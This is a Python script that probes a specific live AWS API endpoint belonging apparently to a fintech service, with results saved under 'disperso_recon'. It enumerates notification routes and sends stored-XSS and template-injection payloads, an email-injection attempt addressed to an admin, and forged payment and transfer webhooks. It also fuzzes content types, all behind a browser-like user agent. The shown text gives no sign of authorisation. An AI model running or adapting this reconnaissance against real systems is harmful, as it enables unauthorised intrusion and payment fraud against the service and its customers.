import requests, json, time, sys

BASE = "https://rdrrxexkm4.execute-api.us-east-2.amazonaws.com/prod"
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

results = []

def probe(method, path, body=None, ct=None, label=""):
    url = f"{BASE}{path}"
    hdrs = dict(HEADERS)
    if ct:
        hdrs["Content-Type"] = ct
    try:
        if method == "GET":
            r = requests.get(url, headers=hdrs, timeout=15)
        elif method == "POST":
            if ct and "xml" in ct:
                r = requests.post(url, headers=hdrs, data=body or "", timeout=15)
            else:
                r = requests.post(url, headers=hdrs, json=body, timeout=15)
        elif method == "PUT":
            r = requests.put(url, headers=hdrs, json=body, timeout=15)
        elif method == "DELETE":
            r = requests.delete(url, headers=hdrs, timeout=15)
        elif method == "PATCH":
            r = requests.patch(url, headers=hdrs, json=body, timeout=15)
        else:
            return
        
        resp_body = r.text[:500] if r.text else "(empty)"
        entry = {
            "method": method, "path": path, "status": r.status_code,
            "length": len(r.text), "body_preview": resp_body, "label": label
        }
        results.append(entry)
        marker = "***" if r.status_code not in (403, 404) else ""
        print(f"  {marker}{method} {path} -> {r.status_code} ({len(r.text)}b) {label}")
        if r.status_code not in (403, 404) and r.text:
            print(f"    Body: {resp_body[:200]}")
    except Exception as e:
        print(f"  ERR {method} {path} -> {e}")
    time.sleep(0.5)

print("=== 1. NOTIFICATION SUB-ROUTES ===")
sub_routes = [
    "/api/v1/notification",
    "/api/v1/notification/new-potential-client",
    "/api/v1/notification/transfer",
    "/api/v1/notification/payment",
    "/api/v1/notification/spei",
    "/api/v1/notification/stp",
    "/api/v1/notification/settlement",
    "/api/v1/notification/webhook",
    "/api/v1/notification/callback",
    "/api/v1/notification/email",
    "/api/v1/notification/sms",
    "/api/v1/notification/status",
    "/api/v1/notification/config",
    "/api/v1/notification/template",
    "/api/v1/notification/send",
]
for path in sub_routes:
    probe("GET", path, label="sub-route GET")
    probe("POST", path, body={"test": True}, label="sub-route POST")

print("\n=== 2. NOTIFICATION PAYLOADS ===")
payloads = [
    ({"email":"test@test.com","name":"Test","phone":"1234567890","company":"TestCo"}, "lead form"),
    ({"email":"test@test.com","message":"test","type":"new-potential-client"}, "with type"),
    ({"rut":"12345678-9","taxId":"RFC123456","clabe":"646180254648589583","amount":100,"currency":"MXN"}, "fintech fields"),
    ({"event":"payment.completed","data":{"amount":100,"currency":"MXN","clabe":"646180254648589583","reference":"TEST123"}}, "webhook sim"),
    ({"event":"transfer.created","data":{"bankCode":"072","accountNumber":"1234567890","beneficiary":"Test"}}, "transfer webhook"),
    ({"to":"admin@disperso.com","subject":"Test","body":"<script>alert(1)</script>"}, "email injection"),
    ({"name":"<img src=x onerror=alert(1)>","email":"test@test.com"}, "xss stored"),
    ({"name":"{{7*7}}","email":"${7*7}","company":"#{7*7}"}, "ssti probe"),
]
for body, label in payloads:
    probe("POST", "/api/v1/notification", body=body, label=label)
    probe("POST", "/api/v1/notification/new-potential-client", body=body, label=f"npc-{label}")

print("\n=== 3. CONTENT-TYPE FUZZING ===")
probe("POST", "/api/v1/notification", body="<xml><test>1</test></xml>", ct="application/xml", label="xml")
probe("POST", "/api/v1/notification", body="test=1&email=a@b.com", ct="application/x-www-form-urlencoded", label="form")
probe("POST", "/api/v1/notification", body="plain text", ct="text/plain", label="text")

print("\n=== DONE ===")
with open("disperso_recon/notification_results.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"Saved {len(results)} results to notification_results.json")
